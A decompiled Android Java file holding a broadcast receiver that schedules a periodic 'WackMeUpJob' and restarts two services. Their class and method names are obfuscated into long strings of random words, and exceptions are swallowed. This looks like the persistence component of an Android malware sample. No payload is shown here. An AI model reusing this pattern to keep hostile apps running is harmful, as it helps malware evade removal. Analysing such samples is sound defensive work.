package com.appser;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import com.appser.verapq.R;

public class SensorRestarterBroadcastReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        try {
            scheduleJob(context);
            safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.p_safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5_r = context.getResources().getString(R.string.surprisingt56);
            if (advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex30.segavsphereksaturnbsusedcognitiveoplacinggviewsvruntimerbrazilianmgenderesslhfouldhelpsrperspectivesz49(advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.class, context)) {
                safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.p_safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5_r = context.getResources().getString(R.string.surprisingt56);
                context.startService(new Intent(context, advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.class));
            }
            if (advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex30.segavsphereksaturnbsusedcognitiveoplacinggviewsvruntimerbrazilianmgenderesslhfouldhelpsrperspectivesz49(verifiediknightsfseqktaiwanimagnificentsmerchantzcurriculumyhundredgebonykimpactshmobilityw33.class, context)) {
                context.startService(new Intent(context, verifiediknightsfseqktaiwanimagnificentsmerchantzcurriculumyhundredgebonykimpactshmobilityw33.class));
            }
        } catch (Exception unused) {
        }
    }

    public static void scheduleJob(Context context) {
        JobInfo jobInfo;
        JobScheduler jobScheduler = (JobScheduler) context.getSystemService("jobscheduler");
        ComponentName componentName = new ComponentName(context, WackMeUpJob.class);
        if (Build.VERSION.SDK_INT >= 24) {
            jobInfo = new JobInfo.Builder(100, componentName).setPeriodic(900000).build();
        } else {
            jobInfo = new JobInfo.Builder(100, componentName).setPeriodic(15000).build();
        }
        jobScheduler.schedule(jobInfo);
    }
}
